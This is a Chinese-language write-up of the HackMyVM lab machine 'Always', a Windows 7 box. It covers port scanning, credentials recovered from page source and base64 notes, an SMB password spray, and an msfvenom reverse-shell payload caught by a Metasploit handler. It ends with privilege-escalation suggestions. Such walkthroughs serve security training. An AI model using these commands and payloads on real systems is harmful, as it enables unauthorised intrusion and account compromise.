---
title: HMV-Always
description: 'Beginner friendly, easy windows box. Basic enumeration skills and windows privilege escalation knowledge will open your way.'
pubDate: 2025-12-13
image: /machine/Always.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765604553052-9740b240-5095-4427-9de3-b8dd17e17c11.png)

# 信息收集
## IP定位
```bash
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
172.16.52.224   08:00:27:f6:b3:bb       (Unknown)                                                                                   
```

## nmap扫描
```bash
──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 172.16.52.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 00:48 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 172.16.52.224
Host is up (0.00028s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-12-13T05:49:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Always-PC
| Not valid before: 2025-12-12T05:47:19
|_Not valid after:  2026-06-13T05:47:19
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8080/tcp  open  http               Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: We Are Sorry
| http-methods: 
|_  Potentially risky methods: TRACE
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -30m00s, deviation: 1h00m00s, median: 0s
|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f6:b3:bb (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Always-PC
|   NetBIOS computer name: ALWAYS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-13T07:49:40+02:00
| smb2-time: 
|   date: 2025-12-13T05:49:40
|_  start_date: 2025-12-13T05:47:19
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.98 seconds
```

## SMB匿名连接
```bash
┌──(root㉿kali)-[/home/kali]
└─# smbmap -H 172.16.52.224                                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Access denied on 172.16.52.224, no fun for you...
[*] Closed 1 connections                                                                                                     
                            
```

这说明：

+ **SMB 服务是正常的**
+ 能建立 SMB 会话
+ **Guest / Anonymous 被系统识别**
+ 但权限被严格限制
+ **没有任何可枚举的共享**
+ 连 `IPC$` 的有用信息都不给

## ftp匿名连接
```bash
┌──(root㉿kali)-[/home/kali]
└─# ftp anonymous@172.16.52.224  
Connected to 172.16.52.224.
220 Microsoft FTP Service
331 Password required for anonymous.
```

这说明：

+ FTP 服务 **开启**
+ **anonymous 用户存在**
+ 但 **被策略禁止登录**

## 8080端口
```bash
<DOCTYPE html>
<head>
	<title>We Are Sorry</title>
</head>
<body>
	<center><h1>Our Site Is Under Maintenance. Please Come Back Again Later.</h1></center>
</body>
</html>
```

+ **We Are Sorry**  
👉 _我们很抱歉_
+ **Our Site Is Under Maintenance. Please Come Back Again Later.**  
👉 _我们的网站正在维护中，请稍后再访问。_

### 目录扫描
```bash
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://172.16.52.224:8080/  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                          
                                                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_172.16.52.224_8080/__25-12-13_00-59-57.txt

Target: http://172.16.52.224:8080/

[00:59:57] Starting: 
[01:00:00] 301 -  240B  - /Admin  ->  http://172.16.52.224:8080/Admin/      
[01:00:00] 301 -  240B  - /admin  ->  http://172.16.52.224:8080/admin/
[01:00:00] 301 -  240B  - /ADMIN  ->  http://172.16.52.224:8080/ADMIN/
[01:00:00] 200 -    3KB - /admin%20/
[01:00:01] 301 -  241B  - /admin.  ->  http://172.16.52.224:8080/admin./    
[01:00:01] 200 -    3KB - /Admin/                                           
[01:00:01] 200 -    3KB - /admin/
[01:00:01] 200 -    3KB - /admin/index.html
```

#### /admin
访问路由是一个登录框

看一下源代码

```bash
<body>
    <div class="container">
        <h2>Login</h2>
        <form id="loginForm" action="admin_notes.html" method="POST" onsubmit="return validateForm()">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="error" id="errorMessage"></div>
        <div class="footer">2024 Always Corp. All Rights Reserved.</div>
    </div>

    <script>
        function validateForm() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const errorMessage = document.getElementById("errorMessage");

            
            if (username === "admin" && password === "adminpass123") {
                return true; 
            }

            errorMessage.textContent = "Invalid Username Or Password!";
            return false; 
        }
    </script>
</body>
```

直接使用代码中嵌入的admin/adminpass123

进入得到Admin's Notes

```bash
ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=
```

base64解码

```bash
ftpuser:KeepGoingBro!!!
```

尝试ftp连接

```bash
┌──(root㉿kali)-[/home/kali]
└─# ftp ftpuser@172.16.52.224
Connected to 172.16.52.224.
220 Microsoft FTP Service
331 Password required for ftpuser.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp> get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************************************************|    56        1.21 MiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (327.46 KiB/s)
ftp> exit
221 Goodbye
```



```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# cat robots.txt 
User-agent: *
Disallow: /admins-secret-pagexxx.html
```

## [admins-secret-pagexxx.html](http://172.16.52.224:8080/admins-secret-pagexxx.html)
```bash
<body>
    <div class="container">
        <h2>Admin's Secret Notes</h2>
        <ul>
            <li>1) Disable the firewall and Windows Defender.</li>
            <li>2) Enable FTP and SSH.</li>
            <li>3) Start the Apache server.</li>
            <li>4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".</li>
        </ul>
    </div>
</body>
```

 👉 **管理员的秘密笔记**

** **👉** 1）关闭防火墙和 Windows Defender**

** **👉** 2）启用 FTP 和 SSH**

** **👉** 3）启动 Apache 服务器**

** **👉** 4）别忘了修改用户 **`**always**`** 的密码。  
****当前密码是："WW91Q2FudEZpbmRNZS4hLiE="**

解码结果是：

YouCantFindMe.!.!

** 新拿到的系统用户  **

`**always : YouCantFindMe.!.!**`

# Always账户
## smb连接
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# smbmap -u always -p 'YouCantFindMe.!.!' -H 172.16.52.224

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections 
```

## ssh连接
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# ssh always@172.16.52.224                                 
ssh: connect to host 172.16.52.224 port 22: Connection refused

```

## rdp登录
```bash
xfreerdp /v:172.16.52.224 /u:always /p:'YouCantFindMe.!.!' /cert:ignore
```

登录失败

重新回归ftpuser

# ftpuser账户
```bash
──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# enum4linux -u 'always' -p 'YouCantFindMe.!.!' -a 172.16.52.224
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec 13 01:44:11 2025

 =========================================( Target Information )=========================================

Target ........... 172.16.52.224
RID Range ........ 500-550,1000-1050
Username ......... 'always'
Password ......... 'YouCantFindMe.!.!'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 172.16.52.224 )===========================
                                                                                                                                                                 
                                                                                                                                                                 
[+] Got domain/workgroup name: WORKGROUP                                                                                                                         
                                                                                                                                                                 
                                                                                                                                                                 
 ===============================( Nbtstat Information for 172.16.52.224 )===============================
                                                                                                                                                                 
Looking up status of 172.16.52.224                                                                                                                               
        ALWAYS-PC       <20> -         B <ACTIVE>  File Server Service
        ALWAYS-PC       <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

        MAC Address = 08-00-27-F6-B3-BB

 ===================================( Session Check on 172.16.52.224 )===================================
                                                                                                                                                                 
                                                                                                                                                                 
[E] Server doesn't allow session using username 'always', password 'YouCantFindMe.!.!'.  Aborting remainder of tests.                                            
                                                                                                                                                                 
                                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# enum4linux -u 'ftpuser' -p 'KeepGoingBro!!!' -a 172.16.52.224
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec 13 01:44:39 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                 
Target ........... 172.16.52.224                                                                                                                                 
RID Range ........ 500-550,1000-1050
Username ......... 'ftpuser'
Password ......... 'KeepGoingBro!!!'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 172.16.52.224 )===========================
                                                                                                                                                                 
                                                                                                                                                                 
[+] Got domain/workgroup name: WORKGROUP                                                                                                                         
                                                                                                                                                                 
                                                                                                                                                                 
 ===============================( Nbtstat Information for 172.16.52.224 )===============================
                                                                                                                                                                 
Looking up status of 172.16.52.224                                                                                                                               
        ALWAYS-PC       <20> -         B <ACTIVE>  File Server Service
        ALWAYS-PC       <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

        MAC Address = 08-00-27-F6-B3-BB

 ===================================( Session Check on 172.16.52.224 )===================================
                                                                                                                                                                 
                                                                                                                                                                 
[+] Server 172.16.52.224 allows sessions using username 'ftpuser', password 'KeepGoingBro!!!'                                                                    
                                                                                                                                                                 
                                                                                                                                                                 
 ================================( Getting domain SID for 172.16.52.224 )================================
                                                                                                                                                                 
Domain Name: WORKGROUP                                                                                                                                           
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                             
                                                                                                                                                                 
                                                                                                                                                                 
 ==================================( OS information on 172.16.52.224 )==================================
                                                                                                                                                                 
                                                                                                                                                                 
[E] Can't get OS info with smbclient                                                                                                                             
                                                                                                                                                                 
                                                                                                                                                                 
[+] Got OS info for 172.16.52.224 from srvinfo:                                                                                                                  
        172.16.52.224  Wk Sv NT PtB LMB                                                                                                                          
        platform_id     :       500
        os version      :       6.1
        server type     :       0x51003


 =======================================( Users on 172.16.52.224 )=======================================
                                                                                                                                                                 
index: 0x1 RID: 0x1f4 acb: 0x00000210 Account: Administrator    Name: (null)    Desc: Bilgisayarı/etki alanını yönetmede kullanılan önceden tanımlı hesap        
index: 0x2 RID: 0x3e8 acb: 0x00000214 Account: Always   Name: (null)    Desc: (null)
index: 0x3 RID: 0x3e9 acb: 0x00000210 Account: ftpuser  Name: ftpuser   Desc: (null)
index: 0x4 RID: 0x1f5 acb: 0x00000215 Account: Guest    Name: (null)    Desc: Bilgisayara/etki alanına konuk erişiminde kullanılan önceden tanımlı hesap

user:[Administrator] rid:[0x1f4]
user:[Always] rid:[0x3e8]
user:[ftpuser] rid:[0x3e9]
user:[Guest] rid:[0x1f5]

 =================================( Share Enumeration on 172.16.52.224 )=================================
                                                                                                                                                                 
do_connect: Connection to 172.16.52.224 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Uzak Yönetici
        C$              Disk      Varsayılan değer
        IPC$            IPC       Uzak IPC
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.16.52.224                                                                                                                    
                                                                                                                                                                 
//172.16.52.224/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                
//172.16.52.224/C$      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                   
                                                                                                                                                                 
NT_STATUS_INVALID_PARAMETER listing \*                                                                                                                           
//172.16.52.224/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 172.16.52.224 )===========================
                                                                                                                                                                 
                                                                                                                                                                 

[+] Attaching to 172.16.52.224 using ftpuser:KeepGoingBro!!!

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:172.16.52.224)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] Always-PC
        [+] Builtin

[+] Password Info for Domain: Always-PC

        [+] Minimum password length: None
        [+] Password history length: None
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                             
                                                                                                                                                                 
                                                                                                                                                                 
Password Complexity: Disabled                                                                                                                                    
Minimum Password Length: 0


 ======================================( Groups on 172.16.52.224 )======================================
                                                                                                                                                                 
                                                                                                                                                                 
[+] Getting builtin groups:                                                                                                                                      
                                                                                                                                                                 
group:[Administrators] rid:[0x220]                                                                                                                               
group:[Backup Operators] rid:[0x227]
group:[Cryptographic Operators] rid:[0x239]
group:[Distributed COM Users] rid:[0x232]
group:[Event Log Readers] rid:[0x23d]
group:[Guests] rid:[0x222]
group:[IIS_IUSRS] rid:[0x238]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Log Users] rid:[0x22f]
group:[Performance Monitor Users] rid:[0x22e]
group:[Power Users] rid:[0x223]
group:[Remote Desktop Users] rid:[0x22b]
group:[Replicator] rid:[0x228]
group:[Users] rid:[0x221]

[+]  Getting builtin group memberships:                                                                                                                          
                                                                                                                                                                 
Group: Administrators' (RID: 544) has member: Always-PC\Administrator                                                                                            
Group: IIS_IUSRS' (RID: 568) has member: IIS APPPOOL\DefaultAppPool
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: Always-PC\Always
Group: Users' (RID: 545) has member: Always-PC\ftpuser
Group: Guests' (RID: 546) has member: Always-PC\Guest
Group: Remote Desktop Users' (RID: 555) has member: Always-PC\Administrator
Group: Remote Desktop Users' (RID: 555) has member: Always-PC\Always
Group: Performance Monitor Users' (RID: 558) has member: Always-PC\Always

[+]  Getting local groups:                                                                                                                                       
                                                                                                                                                                 
group:[Remote Management Users] rid:[0x3ea]                                                                                                                      

[+]  Getting local group memberships:                                                                                                                            
                                                                                                                                                                 
Group: Remote Management Users' (RID: 1002) has member: Always-PC\Always                                                                                         

[+]  Getting domain groups:                                                                                                                                      
                                                                                                                                                                 
group:[None] rid:[0x201]                                                                                                                                         

[+]  Getting domain group memberships:                                                                                                                           
                                                                                                                                                                 
Group: 'None' (RID: 513) has member: Always-PC\Administrator                                                                                                     
Group: 'None' (RID: 513) has member: Always-PC\Guest
Group: 'None' (RID: 513) has member: Always-PC\Always
Group: 'None' (RID: 513) has member: Always-PC\ftpuser

 ==================( Users on 172.16.52.224 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                 
                                                                                                                                                                 
[I] Found new SID:                                                                                                                                               
S-1-5-21-381724225-1041572993-564731166                                                                                                                          

[I] Found new SID:                                                                                                                                               
S-1-5-21-381724225-1041572993-564731166                                                                                                                          

[I] Found new SID:                                                                                                                                               
S-1-5-32                                                                                                                                                         

[I] Found new SID:                                                                                                                                               
S-1-5-32                                                                                                                                                         

[I] Found new SID:                                                                                                                                               
S-1-5-32                                                                                                                                                         

[I] Found new SID:                                                                                                                                               
S-1-5-32                                                                                                                                                         

[I] Found new SID:                                                                                                                                               
S-1-5-32                                                                                                                                                         

[I] Found new SID:                                                                                                                                               
S-1-5-21-381724225-1041572993-564731166                                                                                                                          

[I] Found new SID:                                                                                                                                               
S-1-5-21-381724225-1041572993-564731166                                                                                                                          

[+] Enumerating users using SID S-1-5-80 and logon username 'ftpuser', password 'KeepGoingBro!!!'                                                                
                                                                                                                                                                 
                                                                                                                                                                 
[+] Enumerating users using SID S-1-5-32 and logon username 'ftpuser', password 'KeepGoingBro!!!'                                                                
                                                                                                                                                                 
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'ftpuser', password 'KeepGoingBro!!!'                     
                                                                                                                                                                 
                                                                                                                                                                 
[+] Enumerating users using SID S-1-5-82-3006700770-424185619-1745488364-794895919 and logon username 'ftpuser', password 'KeepGoingBro!!!'                      
                                                                                                                                                                 
                                                                                                                                                                 
[+] Enumerating users using SID S-1-5-21-381724225-1041572993-564731166 and logon username 'ftpuser', password 'KeepGoingBro!!!'                                 
                                                                                                                                                                 
S-1-5-21-381724225-1041572993-564731166-500 Always-PC\Administrator (Local User)                                                                                 
S-1-5-21-381724225-1041572993-564731166-501 Always-PC\Guest (Local User)
S-1-5-21-381724225-1041572993-564731166-513 Always-PC\None (Domain Group)
S-1-5-21-381724225-1041572993-564731166-1000 Always-PC\Always (Local User)
S-1-5-21-381724225-1041572993-564731166-1001 Always-PC\ftpuser (Local User)
S-1-5-21-381724225-1041572993-564731166-1002 Always-PC\Remote Management Users (Local Group)

 ===============================( Getting printer info for 172.16.52.224 )===============================
                                                                                                                                                                 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND                                                                                  


enum4linux complete on Sat Dec 13 01:45:02 2025

```

**用 **`**ftpuser**`** 去“修改 **`**Always**`** 的密码”——基本不可能。**

除非满足**下面任意一个条件**（你现在都不满足）：

+ `ftpuser` 是 **Administrators**
+ `ftpuser` 有 **Reset Password** 权限
+ `ftpuser` 能 **本地提权到 SYSTEM / Administrator**

而你自己的 `enum4linux` 已经证明了：

```plain
ftpuser ∈ Users
ftpuser ∉ Administrators
```

所以：

❌ **ftpuser 不能给 Always 改密码**  
❌ 也不能“帮你修正密码”

## rdp登录
```bash
xfreerdp /v:172.16.52.224 /u:ftpuser /p:'KeepGoingBro!!!' /cert:ignore
```

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765609374074-ddd9fa89-0982-4290-b433-4f1e7d4d6264.png)

# 密码爆破
```bash
enum4linux -u 'ftpuser' -p 'KeepGoingBro!!!' -a 172.16.52.224 > enum 
grep -i "user:" enum | grep -vi "password" | sed -n 's/.*user:\[\([^]]*\)\].*/\1/p' | sort -u > user
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# cat user
Administrator
Always
ftpuser
Guest
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# vi passwd         
                                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# cat passwd         
KeepGoingBro!!!
YouCantFindMe.!.!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# crackmapexec smb 172.16.52.224 -u ./user -p ./passwd --continue-on-success                
SMB         172.16.52.224   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Administrator:KeepGoingBro!!! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Administrator:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Always:KeepGoingBro!!! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Always:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [+] Always-PC\ftpuser:KeepGoingBro!!! 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\ftpuser:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Guest:KeepGoingBro!!! STATUS_LOGON_FAILURE 
SMB         172.16.52.224   445    ALWAYS-PC        [-] Always-PC\Guest:YouCantFindMe.!.! STATUS_LOGON_FAILURE 

```

还是不行

# ftpuser登录
我真是没招了，直接虚拟机ftpuser登录

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765609543467-041191f0-d010-418a-9338-37de1ea8977f.png)

## 上马
```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.16.55.210 LPORT=7777 -f exe -o shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of exe file: 210432 bytes
Saved as: shell.exe

```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# python -m http.server
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/always]
└─# msfconsole  
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  

                 _---------.                                                                                                                                     
             .' #######   ;."                                                                                                                                    
  .---,.    ;@             @@`;   .---,..                                                                                                                        
." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                       
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                       
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                       
     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                          
          ".@' ; @       @ `.  ;'                                                                                                                                
            |@@@@ @@@     @    .                                                                                                                                 
             ' @@@ @@   @@    ,                                                                                                                                  
              `.@@@@    @@   .                                                                                                                                   
                ',@@     @   ;           _____________                                                                                                           
                 (   3 C    )     /|___ / Metasploit! \                                                                                                          
                 ;@'. __*__,."    \|--- \_____________/                                                                                                          
                  '(.,...."/                                                                                                                                     


       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
+ -- --=[ 1678 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.16.55.210
LHOST => 172.16.55.210
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.16.55.210:9999 
[*] Started reverse TCP handler on 172.16.55.210:7777 
[*] Meterpreter session 1 opened (172.16.55.210:7777 -> 172.16.52.224:49197) at 2025-12-13 02:20:35 -0500

meterpreter > 

```

## msf提权
### 一、先确认当前权限和系统
```plain
getuid
sysinfo
```

如果不是 SYSTEM，继续👇

---

### 二、后台运行 session（很关键）
```plain
background
```

---

### 三、用 MSF 自动提权模块（首选）
`use post/multi/recon/local_exploit_suggester  
set SESSION <你的session_id>  
run`



```bash
meterpreter > getuid
Server username: Always-PC\ftpuser
meterpreter > sysinfo
Computer        : ALWAYS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : tr_TR
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 172.16.52.224 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/modules/exploits/linux/local/sock_sendpage.rb:47: warning: key "Notes" is duplicated and overwritten on line 68
/usr/share/metasploit-framework/modules/exploits/unix/webapp/phpbb_highlight.rb:46: warning: key "Notes" is duplicated and overwritten on line 51
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 172.16.52.224 - 205 exploit checks are being tried...
[+] 172.16.52.224 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 172.16.52.224 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 172.16.52.224 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 172.16.52.224 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 172.16.52.224 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
